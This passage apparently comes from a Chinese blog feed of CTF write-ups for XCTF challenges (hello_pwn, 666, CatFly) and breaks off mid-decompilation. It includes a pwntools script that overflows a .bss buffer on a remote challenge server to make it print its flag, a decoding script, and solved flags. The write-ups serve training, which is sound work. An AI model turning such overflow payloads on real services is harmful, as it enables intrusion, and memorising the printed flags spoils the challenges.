    <content><![CDATA[<h1 id="【攻防世界】Pwn系列之hello-pwn"><a href="#【攻防世界】Pwn系列之hello-pwn" class="headerlink" title="【攻防世界】Pwn系列之hello_pwn"></a>【攻防世界】Pwn系列之hello_pwn</h1><p>运行该程序后可得到以下字符串，但不能对该程序进行输入，输入即退出程序</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bhello_pwn/image-20231114102139912.png" class title="image-20231114102139912">

<p>使用IDA对其进行反汇编，定位start()点</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bhello_pwn/image-20231114102801332.png" class title="image-20231114102801332">

<p>进入main()函数定位点，汇编指令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000040069B main            proc near               ; DATA XREF: start+1D↑o</span><br><span class="line">.text:000000000040069B ; __unwind &#123;</span><br><span class="line">.text:000000000040069B                 push    rbp</span><br><span class="line">.text:000000000040069C                 mov     rbp, rsp</span><br><span class="line">.text:000000000040069F                 mov     edi, 3Ch ; &#x27;&lt;&#x27;  ; seconds</span><br><span class="line">.text:00000000004006A4                 call    _alarm</span><br><span class="line">.text:00000000004006A9                 mov     rax, cs:stdout</span><br><span class="line">.text:00000000004006B0                 mov     esi, 0          ; buf</span><br><span class="line">.text:00000000004006B5                 mov     rdi, rax        ; stream</span><br><span class="line">.text:00000000004006B8                 call    _setbuf</span><br><span class="line">.text:00000000004006BD                 mov     edi, offset s   ; &quot;~~ welcome to ctf ~~     &quot;</span><br><span class="line">.text:00000000004006C2                 call    _puts</span><br><span class="line">.text:00000000004006C7                 mov     edi, offset aLetsGetHellowo ; &quot;lets get helloworld for bof&quot;</span><br><span class="line">.text:00000000004006CC                 call    _puts</span><br><span class="line">.text:00000000004006D1                 mov     edx, 10h        ; nbytes</span><br><span class="line">.text:00000000004006D6                 mov     esi, offset unk_601068 ; buf</span><br><span class="line">.text:00000000004006DB                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000004006E0                 call    _read</span><br><span class="line">.text:00000000004006E5                 mov     eax, cs:dword_60106C</span><br><span class="line">.text:00000000004006EB                 cmp     eax, 6E756161h</span><br><span class="line">.text:00000000004006F0                 jnz     short loc_4006FC</span><br><span class="line">.text:00000000004006F2                 mov     eax, 0</span><br><span class="line">.text:00000000004006F7                 call    sub_400686</span><br><span class="line">.text:00000000004006FC</span><br><span class="line">.text:00000000004006FC loc_4006FC:                             ; CODE XREF: main+55↑j</span><br><span class="line">.text:00000000004006FC                 mov     eax, 0</span><br><span class="line">.text:0000000000400701                 pop     rbp</span><br><span class="line">.text:0000000000400702                 retn</span><br><span class="line">.text:0000000000400702 ; &#125; // starts at 40069B</span><br><span class="line">.text:0000000000400702 main            endp</span><br></pre></td></tr></table></figure>

<p>对其反编译成c语言，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;~~ welcome to ctf ~~     &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;lets get helloworld for bof&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;unk_601068, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( dword_60106C == <span class="number">1853186401</span> )</span><br><span class="line">    sub_400686();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码首先使用read()读取内存中的&amp;unk_601068地址，然后对dword_60106c进行判断是否等于<strong>“1853186401”</strong>，然后调用sub_400686()函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400686</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_400686函数就是读取flag.txt获取flag字符串，所以需使得<strong>dword_60106C &#x3D;&#x3D; 1853186401</strong>，即60106地址为1853186401</p>
<p>我们注意到上方有句代码<strong>read(0, &amp;unk_601068, 0x10uLL);<strong>第一个参数为0，代表标准输入即从终端输入，第三个参数是输入的个数 是0x10，即16个字节，我们先来看601068地址处，这里接受的地址和后面判断的</strong>dword_60106C</strong>都在一起，所以只需将后面<strong>dword_60106C</strong>覆盖修改成<strong>1853186401</strong>即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0000000000601068 unk_601068      db    ? ;               ; DATA XREF: main+3B↑o</span><br><span class="line">.bss:0000000000601069                 db    ? ;</span><br><span class="line">.bss:000000000060106A                 db    ? ;</span><br><span class="line">.bss:000000000060106B                 db    ? ;</span><br><span class="line">.bss:000000000060106C dword_60106C    dd ?                    ; DATA XREF: main+4A↑r</span><br><span class="line">.bss:000000000060106C _bss            ends</span><br></pre></td></tr></table></figure>



<p>编写代码连接远程服务器，传入payload将原地址进行覆盖，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">49340</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x6c</span>-<span class="number">0x68</span>)+p64(<span class="number">1853186401</span>) <span class="comment">#b&#x27;b&#x27;*(0x6c-0x68)为对unk_601068进行填充，p64(1853186401)将整数打包成对应的地址</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>)<span class="comment">#相当于触发器，当收到那一字符串时执行操作</span></span><br><span class="line">io.sendline(payload)<span class="comment">#执行操作，发送payload</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bhello_pwn/image-20231114110907691.png" class title="image-20231114110907691">

<p>得到flag为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyberpeace&#123;a53a92da59b4513fe17c50d026202fad&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>-CTF -Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Reverse系列之666</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8B666/</url>
    <content><![CDATA[<h1 id="【攻防世界】Reverse系列之666"><a href="#【攻防世界】Reverse系列之666" class="headerlink" title="【攻防世界】Reverse系列之666"></a>【攻防世界】Reverse系列之666</h1><p>该ELF文件就是一个简单的验证key的程序</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8B666/image-20231109095228578.png" class title="image-20231109095228578">

<p>使用IDA工具打开该文件，反汇编分析其代码逻辑，其伪代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">240</span>]; <span class="comment">// [rsp+0h] [rbp-1E0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">240</span>]; <span class="comment">// [rsp+F0h] [rbp-F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1E</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please Input Key: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  encode(v5, s);  <span class="comment">//对输入值进行编码计算</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v5) == key ) <span class="comment">//key=12h=18</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, enflag) )   <span class="comment">//enflag=izwhroz&quot;&quot;w&quot;v.K&quot;.Ni</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You are Right&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;flag&#123;This_1s_f4cker_flag&#125;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中对输入值调用encode()进行处理，我们继续跟进encode()代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) != key )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Your Length is Wrong&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; key; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3[i + <span class="number">64</span>] = key ^ (a1[i] + <span class="number">6</span>);</span><br><span class="line">    v3[i + <span class="number">33</span>] = (a1[i + <span class="number">1</span>] - <span class="number">6</span>) ^ key;</span><br><span class="line">    v3[i + <span class="number">2</span>] = a1[i + <span class="number">2</span>] ^ <span class="number">6</span> ^ key;</span><br><span class="line">    *(_BYTE *)(a2 + i) = v3[i + <span class="number">64</span>];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">1LL</span>) = v3[i + <span class="number">33</span>];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">2LL</span>) = v3[i + <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逆向该代码对其反推获取原flag，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> target[]=<span class="string">&quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">18</span>;i+=<span class="number">3</span>)&#123;</span><br><span class="line"></span><br><span class="line">    target[i]=(target[i]^<span class="number">18</span>)<span class="number">-6</span>;</span><br><span class="line"></span><br><span class="line">    target[i+<span class="number">1</span>]=(target[i+<span class="number">1</span>]^<span class="number">18</span>)+<span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    target[i+<span class="number">2</span>]=(target[i+<span class="number">2</span>]^<span class="number">18</span>)^<span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(target);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target = <span class="built_in">list</span>(<span class="string">&quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">18</span>, <span class="number">3</span>):</span><br><span class="line">    target[i] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(target[i]) ^ <span class="number">18</span>) - <span class="number">6</span>)</span><br><span class="line">    target[i + <span class="number">1</span>] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(target[i + <span class="number">1</span>]) ^ <span class="number">18</span>) + <span class="number">6</span>)</span><br><span class="line">    target[i + <span class="number">2</span>] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(target[i + <span class="number">2</span>]) ^ <span class="number">18</span>) ^ <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(target))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得出flag为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unctf&#123;b66_6b6_66b&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8B666/image-20231109123457917.png" class title="image-20231109123457917">]]></content>
      <categories>
        <category>CTF</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>-CTF -Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Reverse系列之CatFly</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8BCatFly/</url>
    <content><![CDATA[<h1 id="【攻防世界】Reverse系列之CatFly"><a href="#【攻防世界】Reverse系列之CatFly" class="headerlink" title="【攻防世界】Reverse系列之CatFly"></a>【攻防世界】Reverse系列之CatFly</h1><p>这个靶场的文件是一个ELF文件，需要在Linux系统上运行</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8BCatFly/image-20231108191429181.png" class title="image-20231108191429181">



<p>使用IDA打开该文件进行静态分析，定位关键函数start，这是由c语言编写的ELF程序</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8BCatFly/image-20231108192224720.png" class title="image-20231108192224720">

<p>在C++中main()在start()启动函数之后，在start()函数中定位main()</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  __int16 v5[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-4B0h] BYREF</span></span><br><span class="line">  <span class="keyword">time_t</span> time1; <span class="comment">// [rsp+18h] [rbp-4A8h] BYREF</span></span><br><span class="line">  <span class="keyword">time_t</span> timer; <span class="comment">// [rsp+20h] [rbp-4A0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> longind; <span class="comment">// [rsp+2Ch] [rbp-494h] BYREF</span></span><br><span class="line">  __int64 s[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-490h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">1008</span>]; <span class="comment">// [rsp+40h] [rbp-480h] BYREF</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v11; <span class="comment">// [rsp+430h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+43Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">double</span> v13; <span class="comment">// [rsp+440h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// [rsp+448h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+450h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// [rsp+454h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v17; <span class="comment">// [rsp+45Ah] [rbp-66h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+45Bh] [rbp-65h]</span></span><br><span class="line">  <span class="keyword">int</span> m; <span class="comment">// [rsp+45Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [rsp+460h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+467h] [rbp-59h]</span></span><br><span class="line">  <span class="keyword">int</span> l; <span class="comment">// [rsp+468h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+46Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+473h] [rbp-4Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [rsp+474h] [rbp-4Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v26; <span class="comment">// [rsp+478h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [rsp+484h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [rsp+488h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+48Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [rsp+490h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">bool</span> v31; <span class="comment">// [rsp+491h] [rbp-2Fh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v32; <span class="comment">// [rsp+492h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+494h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v34; <span class="comment">// [rsp+498h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+49Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [rsp+4A0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+4A4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *haystack; <span class="comment">// [rsp+4A8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  haystack = <span class="number">0LL</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  s[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  s[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(v10));</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">90</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v28 = <span class="built_in">getopt_long</span>(a1, a2, <span class="string">&quot;eshiItnd:f:r:R:c:C:W:H:&quot;</span>, &amp;longopts, &amp;longind);</span><br><span class="line">    <span class="keyword">if</span> ( v28 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v28 &amp;&amp; !*((_QWORD *)&amp;longopts.flag + <span class="number">4</span> * longind) )</span><br><span class="line">      v28 = *(&amp;longopts.val + <span class="number">8</span> * longind);</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> ( v28 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">        dword_E1F8 = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line">        dword_E1EC = (<span class="number">64</span> - <span class="built_in">atoi</span>(optarg)) / <span class="number">2</span>;</span><br><span class="line">        dword_E1F0 = (<span class="built_in">atoi</span>(optarg) + <span class="number">64</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">        v30 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">        dword_E1F0 = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">        dword_E1F4 = (<span class="number">64</span> - <span class="built_in">atoi</span>(optarg)) / <span class="number">2</span>;</span><br><span class="line">        dword_E1F8 = (<span class="built_in">atoi</span>(optarg) + <span class="number">64</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">        dword_E1F4 = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">atoi</span>(optarg) &gt; <span class="number">9</span> &amp;&amp; <span class="built_in">atoi</span>(optarg) &lt;= <span class="number">1000</span> )</span><br><span class="line">          v29 = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">        dword_E104 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">        dword_104C4 = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">        <span class="built_in">sub_67F0</span>(a2);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">        v31 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">        dword_E1EC = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        dword_E108 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">        dword_104C0 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_104C0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v31 = v30 == <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sub_6669</span>();</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)&amp;unk_104E0 + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_66AF</span>(*((<span class="keyword">unsigned</span> __int8 *)&amp;unk_104E0 + i), i);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)&amp;unk_105E0 + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_66AF</span>(*((<span class="keyword">unsigned</span> __int8 *)&amp;unk_105E0 + i), i);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">signal</span>(<span class="number">14</span>, sub_64C0);</span><br><span class="line">    <span class="keyword">if</span> ( !_setjmp(env) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">alarm</span>(<span class="number">1u</span>);</span><br><span class="line">LABEL_58:</span><br><span class="line">      <span class="keyword">while</span> ( !<span class="built_in">feof</span>(stdin) &amp;&amp; v34 &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v18 = <span class="built_in">getchar</span>();</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v18 == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v18 = <span class="built_in">getchar</span>();</span><br><span class="line">          <span class="built_in"><span class="keyword">switch</span></span> ( v18 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-16</span>:</span><br><span class="line">              v33 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> ( <span class="built_in">LOBYTE</span>(s[<span class="number">0</span>]) == <span class="number">24</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">alarm</span>(<span class="number">2u</span>);</span><br><span class="line">                haystack = <span class="built_in">strndup</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s + <span class="number">2</span>, <span class="number">0x3FE</span>uLL);</span><br><span class="line">                ++v34;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">LOBYTE</span>(s[<span class="number">0</span>]) == <span class="number">31</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">alarm</span>(<span class="number">2u</span>);</span><br><span class="line">                dword_E1FC = (<span class="built_in">BYTE1</span>(s[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) | <span class="built_in">BYTE2</span>(s[<span class="number">0</span>]);</span><br><span class="line">                dword_E200 = (<span class="built_in">BYTE3</span>(s[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) | <span class="built_in">BYTE4</span>(s[<span class="number">0</span>]);</span><br><span class="line">                ++v34;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-15</span>:</span><br><span class="line">              <span class="built_in">sub_66AF</span>(<span class="number">241LL</span>, <span class="number">0LL</span>);</span><br><span class="line">              <span class="built_in">fflush</span>(stdout);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">              v33 = <span class="number">1</span>;</span><br><span class="line">              v32 = <span class="number">0</span>;</span><br><span class="line">              <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">              v17 = <span class="built_in">getchar</span>();</span><br><span class="line">              <span class="keyword">if</span> ( !*((_BYTE *)&amp;unk_105E0 + v17) )</span><br><span class="line">                *((_BYTE *)&amp;unk_105E0 + v17) = <span class="number">-4</span>;</span><br><span class="line">              <span class="built_in">sub_66AF</span>(*((<span class="keyword">unsigned</span> __int8 *)&amp;unk_105E0 